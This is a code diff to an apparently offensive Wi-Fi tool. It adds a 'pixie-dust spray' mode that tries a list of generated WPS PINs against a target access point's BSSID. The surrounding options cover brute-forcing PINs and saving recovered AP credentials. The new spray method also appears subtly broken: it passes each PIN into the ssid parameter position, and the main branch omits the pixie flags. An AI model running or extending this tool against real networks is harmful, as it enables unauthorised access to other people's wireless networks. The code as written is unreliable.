@@ -755,6 +755,9 @@ class Companion:
             file.write(pin)
         print('[i] PIN saved in {}'.format(filename))
 
+    def __generate_wpspin(self, bssid):
+        return self.generator.getSuggested(bssid)
+
     def __prompt_wpspin(self, bssid):
         pins = self.generator.getSuggested(bssid)
         if len(pins) > 1:
@@ -819,6 +822,16 @@ class Companion:
 
         self.sendOnly('WPS_CANCEL')
         return False
+
+    def spray(self, bssid, pins, pixiemode=False, pbc_mode=False, showpixiecmd=False, pixieforce=False):
+        generatedPins = self.__generate_wpspin(bssid)
+        if generatedPins:
+            pins.extend(generatedPins)
+
+        for pin in pins:
+            if self.single_connection(bssid, pin, pixiemode=pixiemode, pbc_mode=pbc_mode, showpixiecmd=showpixiecmd,
+                                      pixieforce=pixieforce):
+                break
 
     def single_connection(self, bssid=None, ssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
                           pixieforce=False, store_pin_on_fail=False):
@@ -1222,6 +1235,7 @@ Optional arguments:
 Advanced arguments:
     -d, --delay=<n>          : Set the delay between pin attempts [0]
     -w, --write              : Write AP credentials to the file on success
+    -Z, --pixie-dust-spray   : Run Pixie Dust attack with a list of PINs
     -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
     -X, --show-pixie-cmd     : Always print Pixiewps command
     --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
@@ -1270,6 +1284,11 @@ if __name__ == '__main__':
         '-K', '--pixie-dust',
         action='store_true',
         help='Run Pixie Dust attack'
+        )
+    parser.add_argument(
+        '-Z', '--pixie-dust-spray',
+        action='store_true',
+        help='Run Pixie Dust attack with a list of PINs'
         )
     parser.add_argument(
         '-F', '--pixie-force',
@@ -1379,6 +1398,8 @@ if __name__ == '__main__':
                     companion = Companion(args.interface, args.write, print_debug=args.verbose)
                     if args.bruteforce:
                         companion.smart_bruteforce(args.bssid, args.pin, args.delay)
+                    elif args.pixie_dust_spray:
+                        companion.spray(args.bssid, companion.generator.getSuggested(args.bssid))
                     else:
                         if args.ssid:
                             companion.single_connection(bssid=args.bssid, ssid=args.ssid, pin=args.pin, pixiemode=args.pixie_dust,
